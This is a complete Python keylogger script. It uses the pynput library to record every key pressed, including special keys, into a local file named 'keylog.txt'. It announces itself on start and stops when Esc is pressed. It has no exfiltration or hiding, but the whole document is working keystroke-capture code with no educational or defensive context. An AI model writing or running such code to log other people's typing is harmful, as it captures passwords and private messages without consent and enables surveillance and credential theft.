from pynput import keyboard

# Specify the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write(f" {key} ")

def on_release(key):
    # Exit the keylogger when the 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    print("Keylogger started. Press 'Esc' to stop.")
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
